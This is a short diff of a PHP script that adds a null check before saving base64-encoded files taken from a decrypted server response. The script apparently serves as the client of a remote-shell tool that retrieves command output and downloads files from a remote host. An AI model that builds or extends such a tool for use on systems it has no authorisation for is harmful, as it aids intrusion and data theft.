@@ -120,10 +120,12 @@ do {
             $response          = json_decode($decrypted_content, true);
             $path              = base64_decode($response['path']);
             $files             = $response['files'];
-            foreach ($files as $file) {
-                $content  = $file['content'];
-                $download = base64_to_file($content, getcwd(), basename($file['name']));
-                echo " [+] File \e[94m{$download}\e[0m was downloaded successfully.\n";
+            if(!is_null($files)){
+                foreach ($files as $file) {
+                    $content  = $file['content'];
+                    $download = base64_to_file($content, getcwd(), basename($file['name']));
+                    echo " [+] File \e[94m{$download}\e[0m was downloaded successfully.\n";
+                }
             }
             echo base64_decode($response['output']);
         } else {
